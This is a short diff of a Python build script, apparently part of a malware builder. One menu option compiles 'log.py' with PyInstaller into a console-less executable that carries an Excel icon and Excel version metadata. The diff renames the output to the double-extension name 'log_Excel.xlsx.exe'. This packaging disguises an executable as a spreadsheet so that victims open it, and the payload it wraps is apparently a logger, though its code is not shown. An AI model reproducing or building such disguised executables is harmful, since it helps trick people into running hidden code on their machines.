@@ -71,7 +71,7 @@ elif choice == '2':
     sys.exit()    
 
 elif choice == '3':
-    name = 'abs_Excel.xlsx.exe'
+    name = 'log_Excel.xlsx.exe'
     os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/excel.ver -i Icons/excel.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
